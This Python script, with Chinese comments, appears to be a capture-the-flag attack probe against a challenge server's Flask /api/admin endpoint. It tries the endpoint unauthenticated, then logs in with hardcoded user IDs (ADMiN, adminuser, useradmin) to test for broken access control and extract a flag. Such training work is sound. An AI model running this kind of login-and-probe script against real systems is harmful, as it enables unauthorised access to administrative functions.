import requests
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - GET /api/admin")
print(f"[*] Target: {BASE_URL}")
print()

# 测试1: 不登录直接访问
print("[*] 测试1: 不登录直接访问 /api/admin")

admin_resp = session.get(f"{BASE_URL}/api/admin")
print(f"    GET /api/admin: {admin_resp.status_code}")
print(f"    Response: {admin_resp.text}")

print()

# 测试2: 登录后访问
print("[*] 测试2: 登录后访问 /api/admin")

uid = "3553c1effa0b4698895a4874cfbd86d8"  # ADMi
session.post(f"{BASE_URL}/login", data={"uid": uid})

admin_resp = session.get(f"{BASE_URL}/api/admin")
print(f"    GET /api/admin: {admin_resp.status_code}")
print(f"    Response: {admin_resp.text}")

print()

# 测试3: 用不同用户访问
print("[*] 测试3: 用不同用户访问")

test_users = [
    ("3553c1effa0b4698895a4874cfbd86d8", "ADMiN"),
    ("99803f00735243dab94fa2fd603e5330", "adminuser"),
    ("3b1ffc237a7e4c128cb266905beec204", "useradmin"),
]

for uid, username in test_users:
    # 登录
    session.post(f"{BASE_URL}/login", data={"uid": uid})
    
    # 访问 /api/admin
    admin_resp = session.get(f"{BASE_URL}/api/admin")
    print(f"    [{username}] GET /api/admin: {admin_resp.status_code}")
    print(f"        Response: {admin_resp.text}")
    
    if admin_resp.status_code != 403:
        print(f"        [!!!] 成功访问!")
        
        if "flag" in admin_resp.text.lower():
            print(f"        [!!!] 发现 flag!")
            flag_match = re.search(r'flag\{[^}]+\}', admin_resp.text, re.IGNORECASE)
            if flag_match:
                print(f"        [!!!] Flag: {flag_match.group()}")

print()

print("[*] 测试完成")
